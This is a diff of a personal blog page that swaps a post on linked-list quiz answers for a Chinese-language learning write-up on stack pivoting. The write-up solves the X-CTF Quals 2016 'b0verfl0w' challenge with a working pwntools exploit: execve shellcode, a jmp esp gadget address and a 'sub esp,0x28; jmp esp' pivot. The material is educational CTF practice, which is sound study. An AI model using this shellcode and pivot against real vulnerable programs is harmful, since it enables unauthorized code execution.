@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="Hexo, NexT">
+  <meta name="keywords" content="pwn ROP,">
 
 
 
@@ -79,17 +79,22 @@
 
 
 
-<meta name="description" content="在具有N个结点的单链表中，访问结点和增加结点的时间复杂度分别对应为O(1)和O(N)。 (1分) 答案应为F，单链表访问结点因为只能够一个一个的看，所以并不能像数组存储那样时间复杂度那么低，它的时间复杂度应该为 o(n)，实际上，单链表的几个常见操作时间复杂度都是o(n)的 若用链表来表示一个线性表，则表中元素的地址一定是连续的。 (1分) 答案应为F，链表存储地址并不是连续的，链表各个结点之间的">
+<meta name="description" content="因为今天满课，实在是没有抽出太多时间来学习pwn的知识，只能趁着上英语课的功夫学习了一下关于stack pivoting的知识，这也是ctf wiki中花式栈溢出的第一部分。另外还做了前几道pwnable的题目，因为难度较低所以还在考虑要不要等到之后一块放出来。。。。 stack pivoting原理说明首先看一看基础的原理，他的意思说起来很简单，就是劫持栈指针指向我们想要的位置（比如说我们可以控">
+<meta name="keywords" content="pwn ROP">
 <meta property="og:type" content="article">
-<meta property="og:title" content="数据结构基础--链表">
-<meta property="og:url" content="http://yoursite.com/2018/11/18/数据结构基础-链表/index.html">
+<meta property="og:title" content="pwn学习（6）花式栈溢出1">
+<meta property="og:url" content="http://yoursite.com/2018/11/21/pwn学习（6）花式栈溢出1/index.html">
 <meta property="og:site_name" content="Asa9ao">
-<meta property="og:description" content="在具有N个结点的单链表中，访问结点和增加结点的时间复杂度分别对应为O(1)和O(N)。 (1分) 答案应为F，单链表访问结点因为只能够一个一个的看，所以并不能像数组存储那样时间复杂度那么低，它的时间复杂度应该为 o(n)，实际上，单链表的几个常见操作时间复杂度都是o(n)的 若用链表来表示一个线性表，则表中元素的地址一定是连续的。 (1分) 答案应为F，链表存储地址并不是连续的，链表各个结点之间的">
+<meta property="og:description" content="因为今天满课，实在是没有抽出太多时间来学习pwn的知识，只能趁着上英语课的功夫学习了一下关于stack pivoting的知识，这也是ctf wiki中花式栈溢出的第一部分。另外还做了前几道pwnable的题目，因为难度较低所以还在考虑要不要等到之后一块放出来。。。。 stack pivoting原理说明首先看一看基础的原理，他的意思说起来很简单，就是劫持栈指针指向我们想要的位置（比如说我们可以控">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2018-11-18T14:39:08.908Z">
+<meta property="og:image" content="https://ws2.sinaimg.cn/large/006tNbRwly1fxfx5dn01xj30h60aq40e.jpg">
+<meta property="og:image" content="https://ws3.sinaimg.cn/large/006tNbRwly1fxfx6ydfrjj30h603cwf4.jpg">
+<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tNbRwly1fxfxlb23qgj30zu06i76o.jpg">
+<meta property="og:updated_time" content="2018-11-21T12:01:10.077Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="数据结构基础--链表">
-<meta name="twitter:description" content="在具有N个结点的单链表中，访问结点和增加结点的时间复杂度分别对应为O(1)和O(N)。 (1分) 答案应为F，单链表访问结点因为只能够一个一个的看，所以并不能像数组存储那样时间复杂度那么低，它的时间复杂度应该为 o(n)，实际上，单链表的几个常见操作时间复杂度都是o(n)的 若用链表来表示一个线性表，则表中元素的地址一定是连续的。 (1分) 答案应为F，链表存储地址并不是连续的，链表各个结点之间的">
+<meta name="twitter:title" content="pwn学习（6）花式栈溢出1">
+<meta name="twitter:description" content="因为今天满课，实在是没有抽出太多时间来学习pwn的知识，只能趁着上英语课的功夫学习了一下关于stack pivoting的知识，这也是ctf wiki中花式栈溢出的第一部分。另外还做了前几道pwnable的题目，因为难度较低所以还在考虑要不要等到之后一块放出来。。。。 stack pivoting原理说明首先看一看基础的原理，他的意思说起来很简单，就是劫持栈指针指向我们想要的位置（比如说我们可以控">
+<meta name="twitter:image" content="https://ws2.sinaimg.cn/large/006tNbRwly1fxfx5dn01xj30h60aq40e.jpg">
 
 
 
@@ -119,13 +124,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2018/11/18/数据结构基础-链表/">
+  <link rel="canonical" href="http://yoursite.com/2018/11/21/pwn学习（6）花式栈溢出1/">
 
 
 
 
 
-  <title>数据结构基础--链表 | Asa9ao</title>
+  <title>pwn学习（6）花式栈溢出1 | Asa9ao</title>
   
 
 
@@ -252,7 +257,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/18/数据结构基础-链表/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/21/pwn学习（6）花式栈溢出1/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Asa9ao">
@@ -269,7 +274,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">数据结构基础--链表</h1>
+          <h1 class="post-title" itemprop="name headline">pwn学习（6）花式栈溢出1</h1>
         
 
         <div class="post-meta">
@@ -281,8 +286,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-11-18T20:32:37+08:00">
-                2018-11-18
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-11-21T19:22:14+08:00">
+                2018-11-21
               </time>
             
 
@@ -304,8 +309,8 @@
               
               
                 <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
-                  <a href="/categories/数据结构/" itemprop="url" rel="index">
-                    <span itemprop="name">数据结构</span>
+                  <a href="/categories/pwn/" itemprop="url" rel="index">
+                    <span itemprop="name">pwn</span>
                   </a>
                 </span>
 
@@ -341,72 +346,31 @@
       
 
       
-        <p><strong>在具有N个结点的单链表中，访问结点和增加结点的时间复杂度分别对应为O(1)和O(N)。 (1分)</strong></p>
-<p>答案应为<em>F</em>，单链表访问结点因为只能够一个一个的看，所以并不能像数组存储那样时间复杂度那么低，它的时间复杂度应该为 <em>o(n)</em>，实际上，<em>单链表的几个常见操作时间复杂度都是o(n)的</em></p>
-<p><strong>若用链表来表示一个线性表，则表中元素的地址一定是连续的。 (1分)</strong></p>
-<p>答案应为<em>F</em>，链表存储地址并不是连续的，链表各个结点之间的联系是通过指针来实现的，指针指到的位置就算是链表的上下部分，但实际上指针具体指向哪个地址就是随意的了</p>
-<p><strong>将长度分别为m,n的两个单链表合并为一个单链表的时间复杂度为O(m+n)。 (1分)</strong></p>
-<p>答案应为<em>F</em>，这里因为自己也曾经和有序表的合并搞混过，所以把两种一块拿过来仔细说说</p>
+        <p>因为今天满课，实在是没有抽出太多时间来学习pwn的知识，只能趁着上英语课的功夫学习了一下关于stack pivoting的知识，这也是ctf wiki中花式栈溢出的第一部分。另外还做了前几道pwnable的题目，因为难度较低所以还在考虑要不要等到之后一块放出来。。。。</p>
+<h1 id="stack-pivoting"><a href="#stack-pivoting" class="headerlink" title="stack pivoting"></a>stack pivoting</h1><h2 id="原理说明"><a href="#原理说明" class="headerlink" title="原理说明"></a>原理说明</h2><p>首先看一看基础的原理，他的意思说起来很简单，就是劫持栈指针指向我们想要的位置（比如说我们可以控制的内存，bss段、heap等等），然后在这个位置再进行rop。ctf wiki上为我们总结了几种有可能使用到该技巧的情况：</p>
 <ul>
-<li>普通单链表合并，只需要遍历第一个单链表找到结尾，把第二个单链表直接接上就完事了，<em>时间复杂度为o(n)</em></li>
-<li>有序合并并且合并后仍为有序，我们需要遍历两个链表，对data进行比较决定顺序，所以 <em>时间复杂度应该为o(n+m)</em></li>
+<li>可以控制的栈溢出的字节数较少，难以构造较长的 ROP 链</li>
+<li>开启了 PIE 保护，栈地址未知，我们可以将栈劫持到已知的区域。</li>
+<li>其它漏洞难以利用，我们需要进行转换，比如说将栈劫持到堆空间，从而在堆上写 rop 及进行堆漏洞利用</li>
 </ul>
-<p><strong>附加题目—将N条长度均为M的有序链表进行合并，合并以后的链表也保持有序，时间复杂度为()?</strong></p>
-<p>这应该说是上一个题目的难度up版，答案为o(n*m*logN)，至于具体过程我们在下面仔细</p>
-<ul>
-<li>取每个链表的第一个元素，组成一个数组，然后对数组进行排序，这是我们的第一步的时间复杂度<em>O(NlogN)</em></li>
-<li>将我们排序后数组的第一个节点视为新链表的第一个节点，将剩余链表的结点每次取一个用二叉搜索的方式插入数组，时间复杂度为<em>O(logN)</em></li>
-<li>重复上一步，因为第一步我们已经去除了m个结点，所以重复的次数应当是N*M-1 次，最终的时间复杂度应该是<em>O(NlogN) +  (M - 1) \</em> N * O(logN)= M * N* O(logN)*</li>
-</ul>
-<p><strong>(neuDS)单链表不是一种随机存取的存储结构。 (1分)</strong><br>答案应为<em>F</em>，这个很简单，可以理解为<em>能够通过地址的偏移直接得到相应位置的就是随机存储</em>，比如线性表，不能的就是非随机存储，比如单链表</p>
-<p><strong>设h为不带头结点的单向链表。在h的头上插入一个新结点t的语句是：</strong></p>
-<p>答案应为<em>t->next=h; h=t</em>;因为我们要在头部插入一个新的结点，那我们就需要<em>将新的头部指向原来的头部</em>，而新的单链表的h应该就变成了t，所以有了第二句</p>
-<p><strong>在单链表中，若p所指的结点不是最后结点，在p之后插入s所指结点，则执行</strong></p>
-<p>答案应为<em>s->next=p->next; p->next=s;</em>，因为要插入一个结点s，所以我们要做的第一件事就是把<em>插入前结点的信息先处理，防止信息丢失</em>，所以我们先让s的next指向了p的next，保留下了p的信息，之后让p的next指向s实现插入就ok了  </p>
-<p><strong>带头结点的单链表h为空的判定条件是：</strong></p>
-<p>答案应为<em>h->next == NULL;</em>，因为带头结点的单链表比普通的链表多了个“头”，所以我们的“头”之后才是真正的结点，所以没有结点的条件也就是h的next为NULL</p>
-<p><strong>将两个结点数都为N且都从小到大有序的单向链表合并成一个从小到大有序的单向链表，那么可能的最少比较次数是：</strong></p>
-<p>答案应为<em>N</em>，很简单，假设第一个链表的最大值比第二个链表的最小值小，那么比较的时候其实只<em>进行了第一个链表的N个元素和元素和第二个链表的第一个元素的比较的过程</em>，后面就不用再比较了，所以比较次数其实最小就是N</p>
-<p><strong>线性表若采用链式存储结构时，要求内存中可用存储单元的地址</strong></p>
-<p>答案为<em>连续或不连续都可以</em>，上面提过这个问题了，不啰嗦了</p>
-<p><strong>在具有N个结点的单链表中，实现下列哪个操作，其算法的时间复杂度是O(N)？</strong></p>
-<p>答案为<em>遍历链表和求链表的第i个结点</em>，很简单，不说了</p>
-<p><strong>对于一个具有N个结点的单链表，在给定值为x的结点后插入一个新结点的时间复杂度为 </strong></p>
-<p>答案为<em>O(N)</em>，很简单，我们需要首先遍历找到这个结点</p>
-<p><strong>链表具有的特点是：</strong></p>
-<ul>
-<li>插入、删除不需要移动元素</li>
-<li>不必事先估计存储空间</li>
-<li>所需空间与线性长度成正比</li>
-</ul>
-<p><strong>在一个含有n个结点的有序单链表中插入一个新结点，使单链表仍然保持有序的算法的时间复杂度是（ ）。</strong></p>
-<p>答案还是<em>O(n)</em>，也很简单，因为你还是要遍历单链表来找到你想要的位置</p>
-<p><strong>将长度为n的单链表连接在长度为m的单链表之后的算法的时间复杂度为（ ）。</strong></p>
-<p>答案是<em>O(m)</em>，上面也提过了，不说了</p>
-<p><strong>(neuDS)在单链表中，增加一个头结点的最终目的是为了( )。</strong></p>
-<p>说白了就是<em>方便运算</em>而已</p>
-<p><strong>在单链表中，要删除某一指定结点，必须先找到该结点的（）。</strong></p>
-<p>答案为<em>直接前驱</em>，很简单啊，还是之前提的思想，不管是加还是删，你得保证人家原来的信息都有，直接前驱可是保留着后继的信息的</p>
-<p><strong>以下关于链式存储结构的叙述中，（）是正确的。</strong></p>
-<ul>
-<li>结点除自身信息外还包括指针域，因此存储密度小于顺序存储结构</li>
-<li>逻辑上相邻的结点物理上不必邻接</li>
-<li>插入、删除运算操作方便，不必移动结点</li>
-</ul>
-<p><strong>线性链表具有的特点是（）。</strong></p>
-<ul>
-<li>不必事先估计所需存储空间大小</li>
-<li>插入与删除时不必移动元素</li>
-<li>所需空间与线性长度成正比</li>
-</ul>
-<p><strong>线性表若采用链式存储结构时，要求内存中可用存储单元的地址（）。</strong></p>
-<p>答案应为<em>经常需要进行插入和删除操作</em>，因为比起之后的元素都移动，不如遍历找到后简单的指针变化</p>
-<p><strong>线性表若采用链式存储结构时，要求内存中可用存储单元的地址（）。</strong></p>
-<p>答案是<em>连续或不连续都可以</em>，前面提过了</p>
-<p><strong>不带表头附加结点的单链表为空的判断条件是头指针head满足条件（）。</strong></p>
-<p>答案是<em>head==NULL</em>，之前说过带表头的，那不带表头的也就是第一个结点是头，那为空的条件也就是头为NULL呗</p>
-<p><strong>可以用带表头附加结点的链表表示线性表，也可以用不带头结点的链表表示线性表，前者最主要的好处是（）。</strong></p>
-<p>答案为<em>使空表和非空表的处理统一</em>，说白了就是方便</p>
+<p>当然这个用起来还有一些限制条件，最关键的就是你要能控制栈指针</p>
+<h2 id="X-CTF-Quals-2016-b0verfl0w"><a href="#X-CTF-Quals-2016-b0verfl0w" class="headerlink" title="X-CTF Quals 2016 - b0verfl0w"></a>X-CTF Quals 2016 - b0verfl0w</h2><p>原理看完了就拿题目来练练手吧。题目在ctf wiki的github上可以找到。老规矩先拿ida瞅一眼（保护机制检查不说了，这题啥也没有）<br><img src="https://ws2.sinaimg.cn/large/006tNbRwly1fxfx5dn01xj30h60aq40e.jpg" alt=""><br>可以看到vul函数很明显有栈溢出漏洞，而且还意外发现有个hint的函数，不得不说出题人挺友好的<br><img src="https://ws3.sinaimg.cn/large/006tNbRwly1fxfx6ydfrjj30h603cwf4.jpg" alt=""><br>可以看到hint函数其实就一句sub esp,0x24 ，估计大家也都会想到了，题目的解决思路应该和这有关。</p>
+<p>很明显是栈溢出，因为没有保护，那我们就考虑能不能直接写入shellcode执行，答案是不行，没有合适的地方让我们存储。题目中没有存储的数组，而溢出后只有14个可用字节，所以shellcode是肯定没有办法按照之前的技巧放入的。这时候就需要用到我们的stack poviting技术了</p>
+<p>因为提示很明显了，让esp减掉了0x24，那我们可以想到，我们完全可以在栈上布置shellcode（没有开启DEP），填充完后让esp减掉某个值，再跳转到对应位置，那我们的shellcode不就被执行了吗。</p>
+<p>说干就干，首先要找到能够让我们劫持栈指针的godget，拿ROPgadget查一下<br><img src="https://ws4.sinaimg.cn/large/006tNbRwly1fxfxlb23qgj30zu06i76o.jpg" alt=""><br>可以看到有jmp esp这个指令，那我们就可以开始我们的exp构造工作了</p>
+<pre><code>from pwn import *
+p = process(&apos;./b0verfl0w.dms&apos;)
+jmp_esp = 0x08048504
+shellcode = &quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73&quot;
+shellcode += &quot;\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0&quot;
+shellcode += &quot;\x0b\xcd\x80&quot;
+sub_jmp = asm(&apos;sub esp,0x28;jmp esp&apos;)
+payload = shellcode.ljust(0x20,&apos;a&apos;) + &apos;aaaa&apos; +p32(jmp_esp) + sub_jmp
+#payload = shellcode + (0x20 - len(shellcode))*&apos;a&apos; + &apos;aaaa&apos; + p32(jmp_esp) + sub_jmp
+p.sendline(payload)
+p.interactive()
+</code></pre><p>为什么是-0x28呢？实际上是pad + ebp + retaddr算出来的，pad是0x20，四位的ebp，四位的retaddr，自然是0x28了，当然你也可以用别的，不过那就需要你自己改一下shellcode的布置了。</p>
+<p>successful</p>
 
       
     </div>
@@ -422,6 +386,12 @@
 
     <footer class="post-footer">
       
+        <div class="post-tags">
+          
+            <a href="/tags/pwn-ROP/" rel="tag"># pwn ROP</a>
+          
+        </div>
+      
 
       
       
@@ -431,8 +401,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/11/18/数据结构基础-队列/" rel="next" title="数据结构基础--队列">
-                <i class="fa fa-chevron-left"></i> 数据结构基础--队列
+              <a href="/2018/11/20/pwn学习（5）格式化字符串漏洞2/" rel="next" title="pwn学习（5）格式化字符串漏洞2">
+                <i class="fa fa-chevron-left"></i> pwn学习（5）格式化字符串漏洞2
               </a>
             
           </div>
@@ -440,10 +410,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2018/11/19/数据结构基础-顺序表/" rel="prev" title="数据结构基础--顺序表">
-                数据结构基础--顺序表 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -495,8 +461,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
             
@@ -556,6 +531,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#stack-pivoting"><span class="nav-number">1.</span> <span class="nav-text">stack pivoting</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#原理说明"><span class="nav-number">1.1.</span> <span class="nav-text">原理说明</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#X-CTF-Quals-2016-b0verfl0w"><span class="nav-number">1.2.</span> <span class="nav-text">X-CTF Quals 2016 - b0verfl0w</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
